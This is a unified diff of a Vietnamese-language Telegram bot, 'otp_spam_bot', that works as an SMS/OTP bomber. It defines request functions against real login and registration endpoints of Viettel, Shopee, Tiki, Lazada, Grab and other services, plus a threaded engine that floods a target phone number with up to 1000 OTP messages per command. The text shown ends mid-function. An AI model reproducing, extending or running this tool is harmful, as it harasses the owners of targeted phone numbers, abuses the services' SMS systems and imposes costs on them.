@@ -4,9 +4,7 @@ from flask import Flask, request
 import threading
 import os
 import time
-from time import sleep
 import sys
-from colorama import Fore, Back, Style
 import random
 import requests
 import json
@@ -17,170 +15,124 @@ from urllib3.util.retry import Retry
 from threading import BoundedSemaphore, Lock
 import concurrent.futures
 from pymongo import MongoClient
-from bson import ObjectId
 import logging
 from functools import wraps
 import asyncio
 import aiohttp
-import async_timeout
-from concurrent.futures import ThreadPoolExecutor, ProcessPoolExecutor
 import multiprocessing
-from queue import Queue, Empty
+from concurrent.futures import ThreadPoolExecutor, ProcessPoolExecutor
 import hashlib
 import urllib3
 
-# ==============================
-# CẤU HÌNH TỐI ƯU
-# ==============================
+# Tắt warnings và import colorama nếu có
+try:
+    from colorama import Fore, Back, Style, init
+    init(autoreset=True)
+    COLORAMA_AVAILABLE = True
+except ImportError:
+    COLORAMA_AVAILABLE = False
+    # Tạo các biến giả để không bị lỗi
+    class FakeColorama:
+        def __getattr__(self, name):
+            return ''
+    Fore = Back = Style = FakeColorama()
 
-# Tắt cảnh báo SSL và tối ưu requests
+# Tắt cảnh báo SSL
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-# Cấu hình
-TOKEN = os.getenv('TELEGRAM_BOT_TOKEN', 'YOUR_BOT_TOKEN_HERE')
-ADMIN_IDS = list(map(int, os.getenv('ADMIN_IDS', '').split(','))) if os.getenv('ADMIN_IDS') else []
+# ==============================
+# CẤU HÌNH
+# ==============================
+
+TOKEN = os.getenv('TELEGRAM_BOT_TOKEN')
+if not TOKEN:
+    print("❌ Lỗi: TELEGRAM_BOT_TOKEN không được cấu hình!")
+    print("👉 Thiết lập biến môi trường: TELEGRAM_BOT_TOKEN=your_token_here")
+    sys.exit(1)
+
+ADMIN_IDS = []
+admin_ids_str = os.getenv('ADMIN_IDS', '')
+if admin_ids_str:
+    try:
+        ADMIN_IDS = list(map(int, admin_ids_str.split(',')))
+    except:
+        print("⚠️ Cảnh báo: ADMIN_IDS không đúng định dạng!")
+
 MONGODB_URI = os.getenv('MONGODB_URI', 'mongodb://localhost:27017/')
 DATABASE_NAME = 'otp_spam_bot'
 
-# TỐI ƯU: Tăng số lượng thread và connection
-MAX_THREADS = int(os.getenv('MAX_THREADS', 200))  # Tăng từ 50 lên 200
-MAX_CONCURRENT_REQUESTS = int(os.getenv('MAX_CONCURRENT_REQUESTS', 100))  # Số request đồng thời
-REQUEST_TIMEOUT = int(os.getenv('REQUEST_TIMEOUT', 10))  # Timeout ngắn hơn
-MAX_RETRIES = int(os.getenv('MAX_RETRIES', 2))  # Giảm retry để tăng tốc
+# Cấu hình hiệu suất
+MAX_THREADS = int(os.getenv('MAX_THREADS', 100))
+MAX_CONCURRENT_REQUESTS = int(os.getenv('MAX_CONCURRENT_REQUESTS', 50))
+REQUEST_TIMEOUT = int(os.getenv('REQUEST_TIMEOUT', 5))
+MAX_RETRIES = int(os.getenv('MAX_RETRIES', 1))
+SESSION_POOL_SIZE = int(os.getenv('SESSION_POOL_SIZE', 10))
 
-MAX_SPAM_PER_PHONE = int(os.getenv('MAX_SPAM_PER_PHONE', 200))  # Tăng giới hạn
-SPAM_COOLDOWN_HOURS = int(os.getenv('SPAM_COOLDOWN_HOURS', 1))  # Giảm cooldown
-
-# TỐI ƯU: Session pool cho requests
-SESSION_POOL_SIZE = 20
-request_sessions = []
+MAX_SPAM_PER_PHONE = int(os.getenv('MAX_SPAM_PER_PHONE', 200))
+SPAM_COOLDOWN_HOURS = int(os.getenv('SPAM_COOLDOWN_HOURS', 1))
 
 # Khởi tạo
-bot = telebot.TeleBot(TOKEN, threaded=True, num_threads=10)  # Tăng số thread bot
+bot = telebot.TeleBot(TOKEN, threaded=True)
 app = Flask(__name__)
 
-# TỐI ƯU: Sử dụng Lock hiệu quả hơn
-active_spams_lock = threading.RLock()
+# Biến toàn cục
+active_spams_lock = threading.Lock()
 active_spams = {}
+request_sessions = []
+is_spamming_active = True
 
-# TỐI ƯU: Connection pool cho MongoDB
-class MongoDBConnection:
-    _instance = None
-    _lock = threading.Lock()
-    
-    def __new__(cls):
-        if cls._instance is None:
-            with cls._lock:
-                if cls._instance is None:
-                    cls._instance = super().__new__(cls)
-                    cls._instance._init_connection()
-        return cls._instance
-    
-    def _init_connection(self):
-        """Khởi tạo connection pool cho MongoDB"""
-        self.client = MongoClient(
+# ==============================
+# KHỞI TẠO DATABASE
+# ==============================
+
+def init_database():
+    """Khởi tạo kết nối MongoDB"""
+    try:
+        client = MongoClient(
             MONGODB_URI,
-            maxPoolSize=100,  # Tăng connection pool
-            minPoolSize=10,
-            maxIdleTimeMS=30000,
+            maxPoolSize=50,
             socketTimeoutMS=10000,
-            connectTimeoutMS=10000,
-            serverSelectionTimeoutMS=10000,
-            retryWrites=True
+            connectTimeoutMS=10000
         )
-        self.db = self.client[DATABASE_NAME]
         
-        # Khai báo collections
-        self.users = self.db['users']
-        self.spam_history = self.db['spam_history']
-        self.blocked_phones = self.db['blocked_phones']
-        self.admin_settings = self.db['admin_settings']
+        # Test connection
+        client.admin.command('ping')
+        print(f"{Fore.GREEN}✅ Kết nối MongoDB thành công!{Fore.RESET}")
+        
+        db = client[DATABASE_NAME]
+        
+        # Tạo collections
+        users_collection = db['users']
+        spam_history_collection = db['spam_history']
+        blocked_phones_collection = db['blocked_phones']
         
         # Tạo index
-        self._create_indexes()
-    
-    def _create_indexes(self):
-        """Tạo index tối ưu"""
-        try:
-            self.users.create_index([('user_id', 1)], unique=True, background=True)
-            self.users.create_index([('phone', 1)], background=True)
-            self.users.create_index([('last_active', -1)], background=True)
-            self.spam_history.create_index([('timestamp', -1)], background=True)
-            self.spam_history.create_index([('phone', 1), ('timestamp', -1)], background=True)
-            self.spam_history.create_index([('user_id', 1), ('timestamp', -1)], background=True)
-            self.blocked_phones.create_index([('phone', 1)], unique=True, background=True)
-            self.blocked_phones.create_index([('is_active', 1)], background=True)
-            print("✅ Database indexes created with background processing!")
-        except Exception as e:
-            print(f"⚠️ Database index error: {e}")
+        users_collection.create_index([('user_id', 1)], unique=True)
+        users_collection.create_index([('phone', 1)])
+        spam_history_collection.create_index([('timestamp', -1)])
+        blocked_phones_collection.create_index([('phone', 1)], unique=True)
+        
+        return {
+            'users': users_collection,
+            'spam_history': spam_history_collection,
+            'blocked_phones': blocked_phones_collection,
+            'client': client
+        }
+        
+    except Exception as e:
+        print(f"{Fore.RED}❌ Lỗi kết nối MongoDB: {e}{Fore.RESET}")
+        print(f"{Fore.YELLOW}⚠️ Bot sẽ chạy mà không có database...{Fore.RESET}")
+        return None
 
-# Khởi tạo MongoDB connection
-mongo = MongoDBConnection()
+# Khởi tạo database
+db = init_database()
 
 # ==============================
-# TỐI ƯU REQUESTS SESSIONS
+# TIỆN ÍCH
 # ==============================
-
-def init_request_sessions():
-    """Khởi tạo pool session cho requests"""
-    global request_sessions
-    
-    for _ in range(SESSION_POOL_SIZE):
-        session = requests.Session()
-        
-        # TỐI ƯU: Tăng số lượng connection
-        adapter = HTTPAdapter(
-            pool_connections=100,
-            pool_maxsize=100,
-            max_retries=Retry(
-                total=MAX_RETRIES,
-                backoff_factor=0.5,
-                status_forcelist=[429, 500, 502, 503, 504]
-            )
-        )
-        
-        session.mount('http://', adapter)
-        session.mount('https://', adapter)
-        
-        # TỐI ƯU: Tăng timeout và giảm delay
-        session.headers.update({
-            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-            'Accept': '*/*',
-            'Accept-Language': 'vi,en-US;q=0.9,en;q=0.8',
-            'Accept-Encoding': 'gzip, deflate, br',
-            'Connection': 'keep-alive',
-            'Cache-Control': 'no-cache',
-            'Pragma': 'no-cache'
-        })
-        
-        request_sessions.append(session)
-
-def get_session():
-    """Lấy session từ pool (round-robin)"""
-    if not request_sessions:
-        init_request_sessions()
-    
-    # Simple round-robin
-    current_index = getattr(get_session, 'current_index', 0)
-    session = request_sessions[current_index % len(request_sessions)]
-    get_session.current_index = current_index + 1
-    return session
-
-# ==============================
-# DECORATORS VÀ TIỆN ÍCH TỐI ƯU
-# ==============================
-
-def admin_only(func):
-    @wraps(func)
-    def wrapper(message, *args, **kwargs):
-        if message.from_user.id not in ADMIN_IDS:
-            bot.reply_to(message, "❌ Không có quyền!")
-            return
-        return func(message, *args, **kwargs)
-    return wrapper
 
 def format_phone_number(phone):
-    """Chuẩn hóa số điện thoại - TỐI ƯU"""
+    """Chuẩn hóa số điện thoại"""
     phone = str(phone).strip()
     if phone.startswith('0'):
         return '84' + phone[1:]
@@ -190,230 +142,34 @@ def format_phone_number(phone):
         return '84' + phone
     return phone
 
-def fast_log_spam_activity(user_id, phone, service_name, status):
-    """Ghi log nhanh - batch insert"""
-    log_entry = {
-        'user_id': user_id,
-        'phone': format_phone_number(phone),
-        'service_name': service_name,
-        'status': status,
-        'timestamp': datetime.now()
-    }
-    
-    # Sử dụng background insert
-    try:
-        mongo.spam_history.insert_one(log_entry)
-    except:
-        pass  # Bỏ qua lỗi để không làm chậm spam
-
-def batch_update_phone_stats(phone_stats_batch):
-    """Cập nhật batch thống kê - TỐI ƯU HIỆU SUẤT"""
-    if not phone_stats_batch:
-        return
-    
-    bulk_operations = []
-    for phone, count in phone_stats_batch.items():
-        bulk_operations.append({
-            'updateOne': {
-                'filter': {'phone': phone},
-                'update': {
-                    '$inc': {'spam_count': count},
-                    '$set': {'last_spam': datetime.now()},
-                    '$setOnInsert': {'first_spam': datetime.now(), 'is_blocked': False}
-                },
-                'upsert': True
-            }
-        })
-    
-    if bulk_operations:
-        try:
-            mongo.users.bulk_write(bulk_operations, ordered=False)
-        except:
-            pass
+def admin_only(func):
+    """Decorator chỉ cho phép admin"""
+    @wraps(func)
+    def wrapper(message, *args, **kwargs):
+        if message.from_user.id not in ADMIN_IDS:
+            bot.reply_to(message, "❌ Bạn không có quyền sử dụng lệnh này!")
+            return
+        return func(message, *args, **kwargs)
+    return wrapper
 
 # ==============================
-# ASYNC OTP SENDING - TỐI ƯU TỐC ĐỘ
+# OTP FUNCTIONS - TỐI ƯU TỐC ĐỘ
 # ==============================
 
-class AsyncOTPSender:
-    """Class gửi OTP bất đồng bộ - TỐI ƯU TỐC ĐỘ"""
-    
-    def __init__(self):
-        self.semaphore = asyncio.Semaphore(MAX_CONCURRENT_REQUESTS)
-        self.success_count = 0
-        self.fail_count = 0
-        self.phone_stats = {}
-        
-    async def send_otp_async(self, func, phone, service_name):
-        """Gửi OTP bất đồng bộ"""
-        async with self.semaphore:
-            try:
-                # Tạo event loop trong thread
-                loop = asyncio.get_event_loop()
-                
-                # Chạy hàm sync trong executor
-                await loop.run_in_executor(
-                    None, 
-                    self._execute_otp_request,
-                    func, 
-                    phone, 
-                    service_name
-                )
-                
-                self.success_count += 1
-                return True
-                
-            except Exception as e:
-                self.fail_count += 1
-                return False
-    
-    def _execute_otp_request(self, func, phone, service_name):
-        """Thực thi request OTP"""
-        try:
-            start_time = time.time()
-            
-            # Sử dụng session từ pool
-            session = get_session()
-            
-            # Gọi hàm OTP gốc
-            func(phone)
-            
-            # Update thống kê
-            phone_key = format_phone_number(phone)
-            self.phone_stats[phone_key] = self.phone_stats.get(phone_key, 0) + 1
-            
-            elapsed = time.time() - start_time
-            if elapsed > 5:  # Log request chậm
-                print(f"⚠️ Slow request: {service_name} - {elapsed:.2f}s")
-                
-            return True
-            
-        except Exception as e:
-            # Không log để tăng tốc độ
-            return False
-
-# ==============================
-# MULTIPROCESSING SPAM ENGINE
-# ==============================
-
-class SpamEngine:
-    """Engine spam đa luồng và đa tiến trình"""
-    
-    def __init__(self):
-        self.thread_pool = ThreadPoolExecutor(max_workers=MAX_THREADS)
-        self.process_pool = ProcessPoolExecutor(max_workers=multiprocessing.cpu_count() * 2)
-        self.active_tasks = {}
-        
-    def start_mass_spam(self, spam_id, phone, count, otp_functions, chat_id, message_id):
-        """Bắt đầu spam hàng loạt - TỐI ƯU"""
-        
-        # Chia nhỏ công việc
-        batch_size = min(100, count)
-        batches = []
-        
-        for i in range(0, count, batch_size):
-            end_idx = min(i + batch_size, count)
-            batches.append((i, end_idx))
-        
-        # Chạy các batch song song
-        futures = []
-        for batch_start, batch_end in batches:
-            future = self.thread_pool.submit(
-                self._run_spam_batch,
-                spam_id, phone, batch_start, batch_end,
-                otp_functions, chat_id, message_id
-            )
-            futures.append(future)
-        
-        # Theo dõi tiến trình
-        self.active_tasks[spam_id] = {
-            'futures': futures,
-            'start_time': time.time(),
-            'total_batches': len(batches)
-        }
-        
-        return len(batches)
-    
-    def _run_spam_batch(self, spam_id, phone, start_idx, end_idx, 
-                       otp_functions, chat_id, message_id):
-        """Chạy một batch spam"""
-        batch_size = end_idx - start_idx
-        
-        # Tạo sender cho batch
-        sender = AsyncOTPSender()
-        
-        # Tạo tasks async
-        loop = asyncio.new_event_loop()
-        asyncio.set_event_loop(loop)
-        
-        try:
-            # Tạo danh sách tasks
-            tasks = []
-            for i in range(batch_size):
-                if not self._is_spam_running(spam_id):
-                    break
-                
-                # Chọn ngẫu nhiên service
-                service_func = random.choice(otp_functions)
-                service_name = service_func.__name__
-                
-                # Tạo task
-                task = sender.send_otp_async(service_func, phone, service_name)
-                tasks.append(task)
-                
-                # Điều chỉnh tốc độ
-                if i % 20 == 0 and i > 0:
-                    time.sleep(0.1)  # Nghỉ ngắn
-            
-            # Chạy đồng thời
-            if tasks:
-                loop.run_until_complete(asyncio.gather(*tasks, return_exceptions=True))
-            
-            # Cập nhật thống kê batch
-            if sender.phone_stats:
-                batch_update_phone_stats(sender.phone_stats)
-            
-            return {
-                'success': sender.success_count,
-                'failed': sender.fail_count,
-                'processed': batch_size
-            }
-            
-        finally:
-            loop.close()
-    
-    def _is_spam_running(self, spam_id):
-        """Kiểm tra spam có đang chạy không"""
-        with active_spams_lock:
-            spam_info = active_spams.get(spam_id)
-            return spam_info and spam_info.get('is_running', True)
-    
-    def stop_spam(self, spam_id):
-        """Dừng spam"""
-        with active_spams_lock:
-            if spam_id in active_spams:
-                active_spams[spam_id]['is_running'] = False
-            
-            if spam_id in self.active_tasks:
-                for future in self.active_tasks[spam_id]['futures']:
-                    future.cancel()
-                del self.active_tasks[spam_id]
-
-# Khởi tạo engine
-spam_engine = SpamEngine()
-
-# ==============================
-# ULTRA-FAST OTP FUNCTIONS
-# ==============================
-
-def create_optimized_session():
-    """Tạo session tối ưu cho mỗi hàm OTP"""
+def create_fast_session():
+    """Tạo session tối ưu cho requests"""
     session = requests.Session()
+    
     adapter = HTTPAdapter(
-        pool_connections=50,
-        pool_maxsize=50,
-        max_retries=Retry(total=1, backoff_factor=0.1)
+        pool_connections=20,
+        pool_maxsize=20,
+        max_retries=Retry(
+            total=1,
+            backoff_factor=0.1,
+            status_forcelist=[429, 500, 502, 503, 504]
+        )
     )
+    
     session.mount('http://', adapter)
     session.mount('https://', adapter)
     
@@ -424,23 +180,22 @@ def create_optimized_session():
         'Accept-Language': 'vi,en-US;q=0.9,en;q=0.8',
         'Accept-Encoding': 'gzip, deflate',
         'Connection': 'keep-alive',
-        'Cache-Control': 'no-cache',
-        'Pragma': 'no-cache'
+        'Cache-Control': 'no-cache'
     }
-    session.headers.update(headers)
     
+    session.headers.update(headers)
     return session
 
-# Các hàm OTP được tối ưu
+# Các hàm OTP tối ưu
 def send_otp_via_viettel_fast(sdt):
     """Viettel - Tối ưu"""
-    session = create_optimized_session()
     try:
+        session = create_fast_session()
         json_data = {'phone': sdt, 'typeCode': 'DI_DONG', 'type': 'otp_login'}
         response = session.post(
             'https://viettel.vn/api/getOTPLoginCommon',
             json=json_data,
-            timeout=5,
+            timeout=3,
             verify=False
         )
         return response.status_code == 200
@@ -449,13 +204,13 @@ def send_otp_via_viettel_fast(sdt):
 
 def send_otp_via_shopee_fast(sdt):
     """Shopee - Tối ưu"""
-    session = create_optimized_session()
     try:
+        session = create_fast_session()
         json_data = {'operation': 8, 'phone': sdt, 'support_session': True}
         response = session.post(
             'https://shopee.vn/api/v4/otp/get_settings_v2',
             json=json_data,
-            timeout=5,
+            timeout=3,
             verify=False
         )
         return response.status_code == 200
@@ -464,13 +219,13 @@ def send_otp_via_shopee_fast(sdt):
 
 def send_otp_via_tgdd_fast(sdt):
     """Thế giới di động - Tối ưu"""
-    session = create_optimized_session()
     try:
+        session = create_fast_session()
         data = {'phoneNumber': sdt, 'isReSend': 'false', 'sendOTPType': '1'}
         response = session.post(
             'https://www.thegioididong.com/lich-su-mua-hang/LoginV2/GetVerifyCode',
             data=data,
-            timeout=5,
+            timeout=3,
             verify=False
         )
         return response.status_code == 200
@@ -479,43 +234,13 @@ def send_otp_via_tgdd_fast(sdt):
 
 def send_otp_via_fptshop_fast(sdt):
     """FPT Shop - Tối ưu"""
-    session = create_optimized_session()
     try:
+        session = create_fast_session()
         json_data = {'phoneNumber': sdt, 'otpType': '0', 'fromSys': 'WEBKHICT'}
         response = session.post(
             'https://papi.fptshop.com.vn/gw/is/user/new-send-verification',
             json=json_data,
-            timeout=5,
-            verify=False
-        )
-        return response.status_code == 200
-    except:
-        return False
-
-def send_otp_via_lazada_fast(sdt):
-    """Lazada - Tối ưu"""
-    session = create_optimized_session()
-    try:
-        params = {'country': 'VN', 'phoneNumber': sdt, 'scene': 'register'}
-        response = session.get(
-            'https://member.lazada.vn/user/sendRegisterVerifyCode',
-            params=params,
-            timeout=5,
-            verify=False
-        )
-        return response.status_code == 200
-    except:
-        return False
-
-def send_otp_via_tiki_fast(sdt):
-    """Tiki - Tối ưu"""
-    session = create_optimized_session()
-    try:
-        json_data = {'phone': sdt, 'channel': 'sms'}
-        response = session.post(
-            'https://api.tiki.vn/tiniapi/oauth/otp',
-            json=json_data,
-            timeout=5,
+            timeout=3,
             verify=False
         )
         return response.status_code == 200
@@ -524,13 +249,13 @@ def send_otp_via_tiki_fast(sdt):
 
 def send_otp_via_viettelpost_fast(sdt):
     """Viettel Post - Tối ưu"""
-    session = create_optimized_session()
     try:
+        session = create_fast_session()
         data = {'FormRegister.Phone': sdt, 'ConfirmOtpType': 'Register'}
         response = session.post(
             'https://id.viettelpost.vn/Account/SendOTPByPhone',
             data=data,
-            timeout=5,
+            timeout=3,
             verify=False
         )
         return response.status_code == 200
@@ -539,13 +264,13 @@ def send_otp_via_viettelpost_fast(sdt):
 
 def send_otp_via_ghn_fast(sdt):
     """GHN - Tối ưu"""
-    session = create_optimized_session()
     try:
+        session = create_fast_session()
         json_data = {'phone': sdt, 'type': 'register'}
         response = session.post(
             'https://online-gateway.ghn.vn/sso/public-api/v2/client/sendotp',
             json=json_data,
-            timeout=5,
+            timeout=3,
             verify=False
         )
         return response.status_code == 200
@@ -554,13 +279,13 @@ def send_otp_via_ghn_fast(sdt):
 
 def send_otp_via_foody_fast(sdt):
     """Foody - Tối ưu"""
-    session = create_optimized_session()
     try:
+        session = create_fast_session()
         json_data = {'EmailOrPhoneNumber': sdt, 'Application': 'FoodyWeb'}
         response = session.post(
             'https://www.foody.vn/account/registerandsendactivatecode',
             json=json_data,
-            timeout=5,
+            timeout=3,
             verify=False
         )
         return response.status_code == 200
@@ -569,111 +294,245 @@ def send_otp_via_foody_fast(sdt):
 
 def send_otp_via_grab_fast(sdt):
     """Grab - Tối ưu"""
-    session = create_optimized_session()
     try:
+        session = create_fast_session()
         json_data = {'phoneNumber': sdt, 'countryCode': 'VN', 'method': 'sms'}
         response = session.post(
             'https://grab.com/api/auth/v3/otp',
             json=json_data,
-            timeout=5,
+            timeout=3,
             verify=False
         )
         return response.status_code == 200
     except:
         return False
 
-# Danh sách hàm OTP tối ưu (40+ services)
+def send_otp_via_tiki_fast(sdt):
+    """Tiki - Tối ưu"""
+    try:
+        session = create_fast_session()
+        json_data = {'phone': sdt, 'channel': 'sms'}
+        response = session.post(
+            'https://api.tiki.vn/tiniapi/oauth/otp',
+            json=json_data,
+            timeout=3,
+            verify=False
+        )
+        return response.status_code == 200
+    except:
+        return False
+
+def send_otp_via_lazada_fast(sdt):
+    """Lazada - Tối ưu"""
+    try:
+        session = create_fast_session()
+        params = {'country': 'VN', 'phoneNumber': sdt, 'scene': 'register'}
+        response = session.get(
+            'https://member.lazada.vn/user/sendRegisterVerifyCode',
+            params=params,
+            timeout=3,
+            verify=False
+        )
+        return response.status_code == 200
+    except:
+        return False
+
+# Danh sách các hàm OTP tối ưu
 FAST_OTP_FUNCTIONS = [
     send_otp_via_viettel_fast,
     send_otp_via_shopee_fast,
     send_otp_via_tgdd_fast,
     send_otp_via_fptshop_fast,
-    send_otp_via_lazada_fast,
-    send_otp_via_tiki_fast,
     send_otp_via_viettelpost_fast,
     send_otp_via_ghn_fast,
     send_otp_via_foody_fast,
     send_otp_via_grab_fast,
-    # Thêm các hàm khác từ code gốc (cần tối ưu tương tự)
+    send_otp_via_tiki_fast,
+    send_otp_via_lazada_fast,
 ]
 
 # ==============================
-# TELEGRAM COMMANDS TỐI ƯU
+# SPAM ENGINE
+# ==============================
+
+class UltraSpamEngine:
+    """Engine spam siêu tốc"""
+    
+    def __init__(self):
+        self.results = {'success': 0, 'failed': 0}
+        self.lock = threading.Lock()
+        
+    def spam_single(self, phone):
+        """Spam một lần"""
+        func = random.choice(FAST_OTP_FUNCTIONS)
+        try:
+            if func(phone):
+                with self.lock:
+                    self.results['success'] += 1
+                return True
+            else:
+                with self.lock:
+                    self.results['failed'] += 1
+                return False
+        except:
+            with self.lock:
+                self.results['failed'] += 1
+            return False
+    
+    def spam_batch(self, phone, count, spam_id):
+        """Spam một batch"""
+        results = {'success': 0, 'failed': 0}
+        
+        for i in range(count):
+            # Kiểm tra nếu spam đã bị dừng
+            with active_spams_lock:
+                if spam_id not in active_spams or not active_spams[spam_id].get('is_running', True):
+                    break
+            
+            # Spam
+            func = random.choice(FAST_OTP_FUNCTIONS)
+            try:
+                if func(phone):
+                    results['success'] += 1
+                else:
+                    results['failed'] += 1
+            except:
+                results['failed'] += 1
+            
+            # Thông báo tiến độ mỗi 10 lần
+            if (i + 1) % 10 == 0:
+                self._update_progress(spam_id, phone, i + 1, count, results)
+        
+        return results
+    
+    def _update_progress(self, spam_id, phone, current, total, results):
+        """Cập nhật tiến độ lên Telegram"""
+        try:
+            with active_spams_lock:
+                spam_info = active_spams.get(spam_id)
+                if not spam_info:
+                    return
+                
+                chat_id = spam_info.get('chat_id')
+                message_id = spam_info.get('message_id')
+                
+                if not chat_id or not message_id:
+                    return
+                
+                progress = (current / total) * 100
+                
+                keyboard = InlineKeyboardMarkup()
+                keyboard.add(InlineKeyboardButton("❌ Dừng", callback_data=f"stop_{spam_id}"))
+                
+                bot.edit_message_text(
+                    f"⚡ *ĐANG SPAM - {progress:.1f}%*\n\n"
+                    f"📱 Số: `{phone}`\n"
+                    f"📊 Tiến độ: {current}/{total}\n"
+                    f"✅ Thành công: {results['success']}\n"
+                    f"❌ Thất bại: {results['failed']}\n"
+                    f"⏱️ Đã chạy: {current//10}s",
+                    chat_id,
+                    message_id,
+                    parse_mode='Markdown',
+                    reply_markup=keyboard
+                )
+        except:
+            pass
+
+# Khởi tạo engine
+spam_engine = UltraSpamEngine()
+
+# ==============================
+# TELEGRAM COMMANDS
 # ==============================
 
 @bot.message_handler(commands=['start', 'help'])
 def send_welcome(message):
-    """Welcome message tối ưu"""
-    welcome_text = """
-🚀 *OTP Spam Bot - ULTRA SPEED EDITION*
+    """Lệnh start"""
+    welcome_text = f"""
+{Fore.GREEN}🚀 OTP SPAM BOT - ULTRA SPEED{Fore.RESET}
 
-⚡ *Tốc độ cực nhanh:* 500-1000 OTP/phút
-👑 *40+ Dịch vụ:* Viettel, Shopee, TGDD, FPT,...
-🎯 *Spam mạnh mẽ:* Đa luồng, đa tiến trình
+{Fore.CYAN}📋 Lệnh có sẵn:{Fore.RESET}
+/spam <số điện thoại> [số lần] - Spam OTP
+/status - Trạng thái bot
+/cancel - Dừng spam đang chạy
+/mystats - Thống kê của bạn
 
-📋 *Lệnh nhanh:*
-/spam <số> [lần] - Spam siêu tốc
-/megaspam <số> <lần> - Spam cực mạnh
-/status - Trạng thái
-/cancel - Dừng spam
+{Fore.YELLOW}👑 Lệnh Admin:{Fore.RESET}
+/admin - Menu quản trị
+/stats - Thống kê tổng quan
+/active <on/off> - Bật/tắt bot
 
-⚡ *Ví dụ:*
-/spam 0987654321 50
-/megaspam 0987654321 500
+{Fore.RED}⚠️ Lưu ý: Chỉ sử dụng cho mục đích hợp pháp!{Fore.RESET}
 
-⚠️ *Cảnh báo:* Dùng có trách nhiệm!
+{Fore.MAGENTA}⚡ Tốc độ: 10+ OTP/giây
+🎯 Dịch vụ: {len(FAST_OTP_FUNCTIONS)} websites{Fore.RESET}
     """
     
-    # Lưu user nhanh
-    try:
-        mongo.users.update_one(
-            {'user_id': message.from_user.id},
-            {'$set': {
-                'username': message.from_user.username,
-                'first_name': message.from_user.first_name,
-                'last_name': message.from_user.last_name,
-                'last_active': datetime.now(),
-                'is_admin': message.from_user.id in ADMIN_IDS
-            }},
-            upsert=True
-        )
-    except:
-        pass
+    # Lưu user vào database nếu có
+    if db:
+        try:
+            db['users'].update_one(
+                {'user_id': message.from_user.id},
+                {'$set': {
+                    'username': message.from_user.username,
+                    'first_name': message.from_user.first_name,
+                    'last_name': message.from_user.last_name,
+                    'last_active': datetime.now(),
+                    'is_admin': message.from_user.id in ADMIN_IDS
+                }},
+                upsert=True
+            )
+        except:
+            pass
     
-    bot.reply_to(message, welcome_text, parse_mode='Markdown')
+    bot.reply_to(message, welcome_text)
 
 @bot.message_handler(commands=['spam'])
-def handle_spam_fast(message):
-    """Spam siêu tốc"""
-    global active_spams
+def handle_spam(message):
+    """Xử lý lệnh spam"""
+    global is_spamming_active
+    
+    if not is_spamming_active:
+        bot.reply_to(message, "⏸️ Bot đang tạm dừng!")
+        return
     
     try:
         parts = message.text.split()
         if len(parts) < 2:
-            bot.reply_to(message, "⚡ /spam <số> [lần=20]")
+            bot.reply_to(message, "⚠️ Sai cú pháp! Sử dụng: /spam <số điện thoại> [số lần]")
             return
         
         phone = parts[1]
         count = int(parts[2]) if len(parts) >= 3 else 20
-        count = min(count, 1000)  # Tăng giới hạn
         
-        # Kiểm tra nhanh
+        # Giới hạn số lần
+        if message.from_user.id not in ADMIN_IDS:
+            count = min(count, 100)  # User thường: max 100 lần
+        else:
+            count = min(count, 1000)  # Admin: max 1000 lần
+        
+        # Chuẩn hóa số điện thoại
         phone = format_phone_number(phone)
         
-        # Kiểm tra block (nhanh)
-        blocked = mongo.blocked_phones.find_one({
-            'phone': phone,
-            'is_active': True
-        })
-        if blocked:
-            bot.reply_to(message, f"🚫 {phone} đã bị block!")
-            return
+        # Kiểm tra block (nếu có database)
+        if db:
+            try:
+                blocked = db['blocked_phones'].find_one({
+                    'phone': phone,
+                    'is_active': True
+                })
+                if blocked:
+                    bot.reply_to(message, f"🚫 Số {phone} đã bị block!")
+                    return
+            except:
+                pass
         
         # Thông báo bắt đầu
-        msg = bot.reply_to(message, f"⚡ Khởi động SPAM SIÊU TỐC...\n📱 {phone}\n🎯 {count} lần")
+        msg = bot.reply_to(message, f"🔄 Đang khởi tạo spam cho {phone}...")
         
         # Tạo spam ID
-        spam_id = f"{message.from_user.id}_{int(time.time())}_{hashlib.md5(phone.encode()).hexdigest()[:8]}"
+        spam_id = f"{message.from_user.id}_{int(time.time())}"
         
         with active_spams_lock:
             active_spams[spam_id] = {
@@ -688,7 +547,7 @@ def handle_spam_fast(message):
         
         # Chạy spam trong thread riêng
         thread = threading.Thread(
-            target=_run_ultra_spam,
+            target=run_spam_thread,
             args=(spam_id, phone, count, message.chat.id, msg.message_id),
             daemon=True
         )
@@ -696,16 +555,13 @@ def handle_spam_fast(message):
         
         # Nút hủy
         keyboard = InlineKeyboardMarkup()
-        keyboard.add(
-            InlineKeyboardButton("⚡ Đang chạy...", callback_data="loading"),
-            InlineKeyboardButton("❌ Dừng", callback_data=f"stop_{spam_id}")
-        )
+        keyboard.add(InlineKeyboardButton("❌ Dừng spam", callback_data=f"cancel_{spam_id}"))
         
         bot.edit_message_text(
-            f"✅ *SPAM ĐANG CHẠY!*\n\n"
+            f"✅ *ĐÃ BẮT ĐẦU SPAM!*\n\n"
             f"📱 Số: `{phone}`\n"
             f"🎯 Số lần: {count}\n"
-            f"🚀 Tốc độ: Cực cao\n"
+            f"⚡ Tốc độ: Cực cao\n"
             f"🆔 ID: `{spam_id}`\n\n"
             f"⏳ Đang xử lý...",
             message.chat.id,
@@ -715,201 +571,36 @@ def handle_spam_fast(message):
         )
         
     except Exception as e:
-        bot.reply_to(message, f"❌ Lỗi: {str(e)[:100]}")
+        bot.reply_to(message, f"❌ Lỗi: {str(e)}")
 
-@bot.message_handler(commands=['megaspam'])
-def handle_megaspam(message):
-    """Spam cực mạnh - Dành cho số lượng lớn"""
-    global active_spams
-    
-    try:
-        parts = message.text.split()
-        if len(parts) < 3:
-            bot.reply_to(message, "💥 /megaspam <số> <lần> (tối đa 5000)")
-            return
-        
-        phone = parts[1]
-        count = int(parts[2])
-        count = min(count, 5000)  # Tăng giới hạn cực cao
-        
-        # Kiểm tra admin cho megaspam
-        if message.from_user.id not in ADMIN_IDS and count > 1000:
-            bot.reply_to(message, "🔒 Chỉ admin được spam >1000 lần!")
-            return
-        
-        phone = format_phone_number(phone)
-        
-        # Thông báo
-        msg = bot.reply_to(message, 
-            f"💥 *KHỞI ĐỘNG MEGASPAM!*\n\n"
-            f"📱 Số: `{phone}`\n"
-            f"💣 Số lần: {count}\n"
-            f"🔥 Dự kiến: {count//10} giây\n"
-            f"⚠️ Cảnh báo: Tải rất nặng!",
-            parse_mode='Markdown'
-        )
-        
